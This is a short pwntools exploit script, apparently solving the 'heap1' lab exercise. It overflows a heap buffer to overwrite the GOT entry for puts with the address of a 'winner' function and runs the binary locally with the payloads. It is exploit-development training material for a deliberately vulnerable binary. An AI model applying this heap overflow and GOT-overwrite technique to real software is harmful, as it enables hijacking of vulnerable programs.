from pwn import *

e = ELF('./heap1')

puts_got = e.got['puts'] # 0x0002076c
#print(hex(puts_got))
winner_addr = e.symbols['winner'] # 0x000104ac
#print(hex(winner_addr))

# Creating Payload
payload1 = b'A' * 20
payload1 += p32(puts_got)

payload2 = p32(winner_addr)

print("payload1 len : {}".format(len(payload1)))
print("paylaod1     : {}".format(payload1))

print("payload2 len : {}".format(len(payload2)))
print("paylaod2     : {}".format(payload2))


# Sending Payload
print("[+] Sending payload..")

p = process(argv=["./heap1", payload1, payload2])

print(p.recvline().decode())
